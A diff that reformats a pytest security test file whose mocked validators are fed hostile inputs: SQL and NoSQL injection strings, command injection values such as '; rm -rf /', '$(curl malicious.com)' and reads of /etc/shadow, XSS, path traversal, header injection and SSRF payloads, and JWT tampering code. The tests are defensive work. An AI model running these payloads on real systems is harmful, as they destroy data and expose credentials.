@@ -25,6 +25,7 @@ import pytest
 # Fixtures
 # ============================================================================
 
+
 @pytest.fixture
 def security_system():
     """Security validation system."""
@@ -40,6 +41,7 @@ def security_system():
 # TEST-CRITICAL-SEC-INJECTION-01: Injection Attack Prevention
 # ============================================================================
 
+
 @pytest.mark.critical
 @pytest.mark.security
 def test_security_sql_injection_prevention(security_system):
@@ -49,7 +51,7 @@ def test_security_sql_injection_prevention(security_system):
         "1' OR '1'='1",
         "admin'--",
         "' UNION SELECT * FROM passwords--",
-        "1'; DELETE FROM logs WHERE '1'='1"
+        "1'; DELETE FROM logs WHERE '1'='1",
     ]
 
     security_system.input_validator.validate_sql.return_value = False
@@ -68,7 +70,7 @@ def test_security_nosql_injection_prevention(security_system):
         {"$ne": None},
         {"$gt": ""},
         {"username": {"$regex": ".*"}},
-        {"password": {"$exists": True}}
+        {"password": {"$exists": True}},
     ]
 
     security_system.input_validator.validate_nosql.return_value = False
@@ -82,13 +84,7 @@ def test_security_nosql_injection_prevention(security_system):
 @pytest.mark.security
 def test_security_command_injection_prevention(security_system):
     """Test OS command injection prevention."""
-    malicious_commands = [
-        "; rm -rf /",
-        "| cat /etc/passwd",
-        "`whoami`",
-        "$(curl malicious.com)",
-        "&& cat /etc/shadow"
-    ]
+    malicious_commands = ["; rm -rf /", "| cat /etc/passwd", "`whoami`", "$(curl malicious.com)", "&& cat /etc/shadow"]
 
     security_system.input_validator.validate_command.return_value = False
 
@@ -118,6 +114,7 @@ def test_security_ldap_injection_prevention(security_system):
 # TEST-CRITICAL-SEC-XSS-01: XSS/CSRF Protection
 # ============================================================================
 
+
 @pytest.mark.critical
 @pytest.mark.security
 def test_security_xss_prevention_basic(security_system):
@@ -127,7 +124,7 @@ def test_security_xss_prevention_basic(security_system):
         "<img src=x onerror=alert('XSS')>",
         "<svg onload=alert('XSS')>",
         "javascript:alert('XSS')",
-        "<iframe src='javascript:alert(\"XSS\")'></iframe>"
+        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
     ]
 
     security_system.input_validator.sanitize_html.return_value = ""
@@ -149,7 +146,7 @@ def test_security_xss_prevention_advanced(security_system):
         "<img src='x' onerror='eval(atob(\"YWxlcnQoJ1hTUycpOw==\"))'>",
         "<body onload=alert('XSS')>",
         "<input type='text' value='<%= user_input %>'>",
-        "<<SCRIPT>alert('XSS');//<</SCRIPT>"
+        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
     ]
 
     security_system.input_validator.sanitize_html.return_value = ""
@@ -183,20 +180,14 @@ def test_security_csrf_token_validation(security_system):
 def test_security_csrf_token_expiration(security_system):
     """Test CSRF token expiration."""
     # Fresh token (valid)
-    fresh_token = {
-        "token": "csrf_123",
-        "created_at": datetime.now(timezone.utc).timestamp()
-    }
+    fresh_token = {"token": "csrf_123", "created_at": datetime.now(timezone.utc).timestamp()}
 
     security_system.csrf_validator.is_expired.return_value = False
     is_expired = security_system.csrf_validator.is_expired(fresh_token)
     assert is_expired is False
 
     # Old token (expired)
-    old_token = {
-        "token": "csrf_456",
-        "created_at": datetime.now(timezone.utc).timestamp() - 7200  # 2 hours ago
-    }
+    old_token = {"token": "csrf_456", "created_at": datetime.now(timezone.utc).timestamp() - 7200}  # 2 hours ago
 
     security_system.csrf_validator.is_expired.return_value = True
     is_expired = security_system.csrf_validator.is_expired(old_token)
@@ -206,6 +197,7 @@ def test_security_csrf_token_expiration(security_system):
 # ============================================================================
 # TEST-CRITICAL-SEC-JWT-01: JWT Tampering Detection
 # ============================================================================
+
 
 @pytest.mark.critical
 @pytest.mark.security
@@ -224,9 +216,9 @@ def test_security_jwt_tampering_detection():
     import base64
     import json
 
-    tampered_payload = base64.urlsafe_b64encode(
-        json.dumps({"user_id": "admin", "tier": "alpha"}).encode()
-    ).decode().rstrip("=")
+    tampered_payload = (
+        base64.urlsafe_b64encode(json.dumps({"user_id": "admin", "tier": "alpha"}).encode()).decode().rstrip("=")
+    )
 
     tampered_token = f"{parts[0]}.{tampered_payload}.{parts[2]}"
 
@@ -265,10 +257,7 @@ def test_security_jwt_expired_token_rejection():
     secret = "test_secret"
 
     # Create expired token
-    payload = {
-        "user_id": "user_123",
-        "exp": int(time.time()) - 3600  # Expired 1 hour ago
-    }
+    payload = {"user_id": "user_123", "exp": int(time.time()) - 3600}  # Expired 1 hour ago
 
     expired_token = jwt.encode(payload, secret, algorithm="HS256")
 
@@ -284,13 +273,7 @@ def test_security_jwt_expired_token_rejection():
 @pytest.mark.security
 def test_security_jwt_weak_secret_detection(security_system):
     """Test detection of weak JWT secrets."""
-    weak_secrets = [
-        "123456",
-        "password",
-        "secret",
-        "test",
-        "admin"
-    ]
+    weak_secrets = ["123456", "password", "secret", "test", "admin"]
 
     security_system.jwt_adapter.validate_secret_strength.return_value = False
 
@@ -302,6 +285,7 @@ def test_security_jwt_weak_secret_detection(security_system):
 # ============================================================================
 # TEST-CRITICAL-SEC-RATE-01: Rate Limiting Enforcement
 # ============================================================================
+
 
 @pytest.mark.critical
 @pytest.mark.security
@@ -332,9 +316,9 @@ async def test_security_rate_limiting_tier_multipliers(security_system):
     """Test tier-based rate limit multipliers."""
     tiers = {
         "alpha": 30,  # 3.0x multiplier
-        "beta": 20,   # 2.0x multiplier
+        "beta": 20,  # 2.0x multiplier
         "gamma": 15,  # 1.5x multiplier
-        "delta": 10   # 1.0x (base)
+        "delta": 10,  # 1.0x (base)
     }
 
     for tier, expected_limit in tiers.items():
@@ -394,6 +378,7 @@ async def test_security_rate_limiting_distributed_tracking(security_system):
 # Additional Security Tests
 # ============================================================================
 
+
 @pytest.mark.critical
 @pytest.mark.security
 def test_security_path_traversal_prevention(security_system):
@@ -402,7 +387,7 @@ def test_security_path_traversal_prevention(security_system):
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32",
         "....//....//....//etc/passwd",
-        "../../sensitive_data.txt"
+        "../../sensitive_data.txt",
     ]
 
     security_system.input_validator.validate_path.return_value = False
@@ -419,7 +404,7 @@ def test_security_header_injection_prevention(security_system):
     malicious_headers = [
         "value\r\nX-Injected: malicious",
         "value\nSet-Cookie: session=stolen",
-        "value\r\n\r\n<script>alert('XSS')</script>"
+        "value\r\n\r\n<script>alert('XSS')</script>",
     ]
 
     security_system.input_validator.sanitize_header.return_value = "value"
@@ -439,7 +424,7 @@ def test_security_ssrf_prevention(security_system):
         "http://localhost/admin",
         "file:///etc/passwd",
         "http://[::]:80/",
-        "http://0.0.0.0/"
+        "http://0.0.0.0/",
     ]
 
     security_system.input_validator.validate_url.return_value = False
@@ -469,18 +454,12 @@ def test_security_sensitive_data_exposure_prevention(security_system):
     # Error messages should not leak sensitive info
     error_with_secrets = {
         "error": "Database connection failed",
-        "details": {
-            "password": "secret123",  # Should be redacted
-            "api_key": "sk_live_123456"  # Should be redacted
-        }
+        "details": {"password": "secret123", "api_key": "sk_live_123456"},  # Should be redacted  # Should be redacted
     }
 
     security_system.input_validator.sanitize_error.return_value = {
         "error": "Database connection failed",
-        "details": {
-            "password": "[REDACTED]",
-            "api_key": "[REDACTED]"
-        }
+        "details": {"password": "[REDACTED]", "api_key": "[REDACTED]"},
     }
 
     sanitized = security_system.input_validator.sanitize_error(error_with_secrets)
